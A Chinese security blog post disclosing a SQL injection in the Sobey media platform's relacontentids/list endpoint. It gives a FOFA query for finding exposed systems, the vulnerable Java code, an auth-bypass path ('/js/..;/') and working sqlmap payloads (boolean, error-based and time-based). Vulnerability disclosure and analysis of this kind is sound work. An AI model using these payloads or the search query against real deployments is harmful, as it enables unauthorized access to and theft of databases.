---
title: "索贝融媒体 /sobey-mchEditor/mch/relacontentids/list SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-relacontentids-list-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchrelacontentidslist-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/relacontentids/list SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/30 08:18
- 564浏览
- [0评论](#comment)
- 34分钟阅读

深入探索

SQL

数据库

sql

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/relacontentids/list 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/relacontentids/list`的实现逻辑

```
@RestController
@RequestMapping({"/mch/relacontentids"})
public class RelacontentidsController extends BaseController {
    private static final Logger logger = LoggerFactory.getLogger(RelacontentidsController.class);

    @RequestMapping(
        value = {"/list"},
        method = {RequestMethod.GET}
    )
    public Response list(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam(value = "startPublishDate",required = false) String startPublishDate, @RequestParam(value = "endPublishDate",required = false) String endPublishDate, @RequestParam(value = "username",defaultValue = "") String username, @RequestParam(value = "pageSize",required = false,defaultValue = "10") Integer pageSize, @RequestParam(value = "pageIndex",required = false,defaultValue = "0") Integer pageIndex) {
        List<Map<String, Object>> rows = new ArrayList();
        Map<String, Object> row = new HashMap();
        rows.add(row);
        StringBuffer sql = new StringBuffer("select a.title, relac.createUserName creator ,relac.createUserCode creatorCode,count(distinct relac.contentid) num ,relac.articleid from zcnrelacontentid  relac inner join zcnarticle a on a.id = relac.articleid ");
        if (StringUtils.isNotEmpty(username)) {
            try {
                sql.append(String.format(" and relac.createUserName  like '%%%s%%' ", URLDecoder.decode(username, "utf-8")));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        sql.append("where a.ifval = '1' ");
```

代码一看就很明了了，**username**使用**String.format**格式化后被直接拼接在like语句中，从而造成了[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。如果没有`String.format`，就不存在，因为默认的`append`方法底层是**参数化查询**。

# 漏洞复现

> 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分
>
> 代码安全审计

```
GET /sobey-mchEditor/js/..;/mch/relacontentids/list?siteCode=&token=&userCode=admin&locale=zh&username='SQLI_POC HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/mch/relacontentids/list SQL注入漏洞](images/img-001-8e0d3e1632bd.webp)](https://image.mrxn.net/61bafffe6ff24ddebfb6b18ec0e9fe32.webp)

成功利用报错注入在响应回显当前数据用户

漏洞预警服务

[SQLMAP](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/mch/relacontentids/list?siteCode=&token=&userCode=admin&locale=zh&username=' AND EXTRACTVALUE(3608,CASE WHEN (3608=3608) THEN 3608 ELSE 0x3A END) AND 'DAmH'='DAmH

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/mch/relacontentids/list?siteCode=&token=&userCode=admin&locale=zh&username=' AND GTID_SUBSET(CONCAT(0x716b787171,(SELECT (ELT(1709=1709,1))),0x71626a7671),1709) AND 'bckN'='bckN

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/mch/relacontentids/list?siteCode=&token=&userCode=admin&locale=zh&username=' AND 8319=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND 'wrRE'='wrRE
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#sqlmap](https://mrxn.net/tag/sqlmap)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
